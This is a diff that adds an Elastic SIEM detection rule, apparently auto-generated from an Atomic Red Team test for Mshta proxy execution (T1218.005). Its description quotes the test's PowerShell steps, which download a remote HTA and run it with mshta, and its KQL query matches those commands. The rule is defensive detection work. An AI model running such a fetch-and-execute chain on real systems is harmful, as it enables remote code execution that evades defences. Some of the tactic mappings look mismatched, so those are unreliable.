@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Mshta Executes Remote HTML Application (HTA)' (GUID: c4b97eeb-5249-4455-a607-59f95485cb45) of technique T1218.005 (Signed Binary Proxy Execution: Mshta). Test Description: Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.. Command/Steps: $var =Invoke-WebRequest \\\"#{hta_url}\\\"\n$var.content|out-file \\\"#{temp_file}\\\"\nmshta \\\"#{temp_file}\\\"\nstart-sleep -s 15\nstop-process -name \\\"calculator\\\" -Forc..."
+from = "now-9m"
+rule_id = "64a22ea6-0743-4f77-8f50-77782bc521ff"
+language = "kql"
+name = "Atomic Test: T1218.005 - Mshta Executes Remote HTML Application (HTA)"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1218.005/T1218.005.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1218.005", "c4b97eeb-5249-4455-a607-59f95485cb45", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*$var*\\\" AND powershell.script_block_text : \\\"*=Invoke-WebRequest*\\\" AND powershell.script_block_text : \\\"*$var.content|out-file*\\\" OR (process.command_line : \\\"*$var*\\\" AND process.command_line : \\\"*=Invoke-WebRequest*\\\" AND process.command_line : \\\"*$var.content|out-file*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1218.005"
+name = "Mshta Executes Remote HTML Application (HTA)"
+reference = "https://attack.mitre.org/techniques/T1218/005"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1218/005"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1218/005"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1218/005"
+
+
